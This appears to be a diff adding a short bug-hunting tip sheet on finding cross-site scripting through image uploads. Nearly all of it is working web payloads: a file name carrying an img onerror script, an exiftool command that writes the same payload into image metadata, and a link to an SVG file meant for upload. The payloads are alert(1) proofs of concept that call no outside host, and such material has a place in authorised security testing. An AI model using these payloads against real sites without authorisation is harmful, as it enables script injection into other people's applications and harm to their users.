@@ -1,0 +1,13 @@
+3 WAYS TO FIND XSS IN IMAGE UPLOAD <3
+
+1. XSS in image name
+Ex: Upload image with name "><img src=x onerror=alert(1)>.png
+
+2. XSS in image metadata
+Ex: Add XSS payload in your image payload
+Command: exiftool -Comment='"><img src=x onerror=alert(1)>' IMAGE.png
+Install: https://exiftool.org/install.html
+
+3. XSS in SVG file
+Web applications often allow SVG upload, use this SVG file: 
+https://gist.github.com/rudSarkar/76f1ce7a65c356a5cd71d058ab76a344
